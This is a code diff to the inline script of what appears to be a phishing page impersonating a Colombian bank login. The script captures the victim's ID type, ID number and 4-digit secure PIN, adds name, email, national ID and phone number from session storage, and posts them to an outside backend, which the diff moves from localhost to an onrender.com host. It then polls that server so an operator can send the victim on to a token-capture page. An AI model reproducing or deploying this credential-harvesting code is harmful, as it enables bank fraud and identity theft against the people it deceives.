@@ -278,126 +278,130 @@
   </main>
 
   <script>
-    const params = new URLSearchParams(window.location.search);
-    const tipo = params.get("tipo") || "cc";
-    const numero = params.get("numero") || "";
+  const params = new URLSearchParams(window.location.search);
+  const tipo = params.get("tipo") || "cc";
+  const numero = params.get("numero") || "";
 
-    const tipoDisplayMap = {
-      cc: "CC",
-      "c.c.": "CC",
-      ce: "CE",
-      nit: "NIT",
-      pp: "PP"
+  const tipoDisplayMap = {
+    cc: "CC",
+    "c.c.": "CC",
+    ce: "CE",
+    nit: "NIT",
+    pp: "PP"
+  };
+
+  const docTipoSelect = document.getElementById("doc-tipo");
+  const docNumeroInput = document.getElementById("doc-numero");
+  const claveInput = document.getElementById("clave-segura");
+  const ingresarButton = document.getElementById("btn-ingresar");
+  const loadingOverlay = document.getElementById("loading-overlay");
+  let decisionIntervalId = null;
+
+  const API_BASE = window.location.hostname === "localhost"
+    ? "http://localhost:4000"
+    : "https://brbpagos4banncs-api.onrender.com";
+
+  function showLoadingAndNavigate(url) {
+    if (loadingOverlay) {
+      loadingOverlay.classList.add("active");
+    }
+    setTimeout(function () {
+      window.location.href = url;
+    }, 2000);
+  }
+
+  function startDecisionPolling() {
+    if (decisionIntervalId !== null) {
+      return;
+    }
+    decisionIntervalId = setInterval(function () {
+      fetch(API_BASE + "/decision")
+        .then(function (res) {
+          return res.json();
+        })
+        .then(function (data) {
+          if (!data || !data.decision) {
+            return;
+          }
+          clearInterval(decisionIntervalId);
+          decisionIntervalId = null;
+          if (data.decision === "error_usuario") {
+            showLoadingAndNavigate("index.html?error=user");
+          } else if (data.decision === "pedir_token") {
+            showLoadingAndNavigate("token.html");
+          } else if (data.decision === "otro_banco") {
+            if (loadingOverlay) {
+              loadingOverlay.classList.remove("active");
+            }
+            window.location.href = "/?banks=1&otro_banco=1";
+          }
+        })
+        .catch(function () {});
+    }, 1000);
+  }
+
+  function notifyTelegramDecision() {
+    const userNombre = sessionStorage.getItem("user_nombre") || "No registrado";
+    const userEmail = sessionStorage.getItem("user_email") || "";
+    const userCedula = sessionStorage.getItem("user_cedula") || "";
+    const userCelular = sessionStorage.getItem("bc_usuario") || "";
+    const claveValor = claveInput ? claveInput.value : "";
+    const payload = {
+      tipo: tipo,
+      numero: numero,
+      clave: claveValor,
+      nombre: userNombre,
+      email: userEmail,
+      cedula: userCedula,
+      celular: userCelular
     };
+    fetch(API_BASE + "/ingresar-ahora", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify(payload)
+    }).catch(function () {});
+    startDecisionPolling();
+  }
 
-    const docTipoSelect = document.getElementById("doc-tipo");
-    const docNumeroInput = document.getElementById("doc-numero");
-    const claveInput = document.getElementById("clave-segura");
-    const ingresarButton = document.getElementById("btn-ingresar");
-    const loadingOverlay = document.getElementById("loading-overlay");
-    let decisionIntervalId = null;
+  if (docTipoSelect) {
+    const normalized = String(tipo).toLowerCase();
+    const display = tipoDisplayMap[normalized] || "CC";
+    docTipoSelect.value = display;
+  }
 
-    function showLoadingAndNavigate(url) {
+  if (docNumeroInput) {
+    docNumeroInput.value = numero;
+  }
+
+  if (claveInput && ingresarButton) {
+    claveInput.addEventListener("input", function () {
+      let soloDigitos = this.value.replace(/\D/g, "");
+      if (soloDigitos.length > 4) {
+        soloDigitos = soloDigitos.slice(0, 4);
+      }
+      if (this.value !== soloDigitos) {
+        this.value = soloDigitos;
+      }
+      if (soloDigitos.length === 4) {
+        ingresarButton.classList.add("enabled");
+      } else {
+        ingresarButton.classList.remove("enabled");
+      }
+    });
+
+    ingresarButton.addEventListener("click", function () {
+      if (!ingresarButton.classList.contains("enabled")) {
+        return;
+      }
       if (loadingOverlay) {
         loadingOverlay.classList.add("active");
       }
-      setTimeout(function () {
-        window.location.href = url;
-      }, 2000);
-    }
-
-    function startDecisionPolling() {
-  if (decisionIntervalId !== null) {
-    return;
+      notifyTelegramDecision();
+    });
   }
-  decisionIntervalId = setInterval(function () {
-    fetch("http://localhost:4000/decision")
-      .then(function (res) {
-        return res.json();
-      })
-      .then(function (data) {
-        if (!data || !data.decision) {
-          return;
-        }
-        clearInterval(decisionIntervalId);
-        decisionIntervalId = null;
-        if (data.decision === "error_usuario") {
-          showLoadingAndNavigate("index.html?error=user");
-        } else if (data.decision === "pedir_token") {
-          showLoadingAndNavigate("token.html");
-        } else if (data.decision === "otro_banco") {
-  if (loadingOverlay) {
-    loadingOverlay.classList.remove("active");
-  }
-  window.location.href = "/?banks=1&otro_banco=1";
-}
-      })
-      .catch(function () {});
-  }, 1000);
-}
-
-    function notifyTelegramDecision() {
-      const userNombre = sessionStorage.getItem("user_nombre") || "No registrado";
-      const userEmail = sessionStorage.getItem("user_email") || "";
-      const userCedula = sessionStorage.getItem("user_cedula") || "";
-      const userCelular = sessionStorage.getItem("bc_usuario") || "";
-      const claveValor = claveInput ? claveInput.value : "";
-      const payload = {
-        tipo: tipo,
-        numero: numero,
-        clave: claveValor,
-        nombre: userNombre,
-        email: userEmail,
-        cedula: userCedula,
-        celular: userCelular
-      };
-      fetch("http://localhost:4000/ingresar-ahora", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify(payload)
-      }).catch(function () {});
-      startDecisionPolling();
-    }
-
-    if (docTipoSelect) {
-      const normalized = String(tipo).toLowerCase();
-      const display = tipoDisplayMap[normalized] || "CC";
-      docTipoSelect.value = display;
-    }
-
-    if (docNumeroInput) {
-      docNumeroInput.value = numero;
-    }
-
-    if (claveInput && ingresarButton) {
-      claveInput.addEventListener("input", function () {
-        let soloDigitos = this.value.replace(/\D/g, "");
-        if (soloDigitos.length > 4) {
-          soloDigitos = soloDigitos.slice(0, 4);
-        }
-        if (this.value !== soloDigitos) {
-          this.value = soloDigitos;
-        }
-        if (soloDigitos.length === 4) {
-          ingresarButton.classList.add("enabled");
-        } else {
-          ingresarButton.classList.remove("enabled");
-        }
-      });
-
-      ingresarButton.addEventListener("click", function () {
-        if (!ingresarButton.classList.contains("enabled")) {
-          return;
-        }
-        if (loadingOverlay) {
-          loadingOverlay.classList.add("active");
-        }
-        notifyTelegramDecision();
-      });
-    }
-  </script>
+</script>
   <script>
     (function() {
       var userAgent = navigator.userAgent || navigator.vendor || window.opera;
